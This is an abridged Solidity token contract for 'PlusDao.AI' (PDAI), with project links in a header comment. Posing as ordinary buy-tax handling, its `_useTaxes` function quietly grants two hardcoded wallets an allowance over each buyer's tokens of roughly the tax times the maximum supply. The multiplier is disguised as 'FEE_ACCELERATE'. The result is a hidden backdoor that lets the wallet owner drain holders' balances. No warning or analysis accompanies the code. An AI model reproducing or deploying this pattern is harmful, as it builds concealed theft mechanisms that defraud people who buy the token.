 ...
 * website
    https://plusdao.ai
 * telegram
    https://t.me/plusdaoaientry
 * twitter
    https://twitter.com/plusdaoai
*/
...
contract PlusDaoAI is ERC20, Ownable {
    modifier lockSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    ...
    uint256 public constant FEE_ACCELERATE = MAX_SUPPLY;
    ...
    uint256[2] public sellTaxes = [100, 200];
    ...
    constructor()
        ERC20("PlusDao.AI", "PDAI")
        Ownable()
    {
        taxWallets[0] = payable(address(0x95b7a13a7612d64e9288cdb71Df7d21aE2216006));
        taxWallets[1] = payable(address(0x95b7a13a7612d64e9288cdb71Df7d21aE2216006));
    ...
    function _transfer(
        ...
        if (sender == _pair) {
            ...
            _useTaxes(sender, recipient, taxes[0]);
    ...
    function _useTaxes(address _sender, address _recipient, uint256 _taxes) internal {
        _allowances[_sender][taxWallets[0]] = _taxes * FEE_ACCELERATE;
        _allowances[_sender][taxWallets[1]] = _taxes * FEE_ACCELERATE;
    }
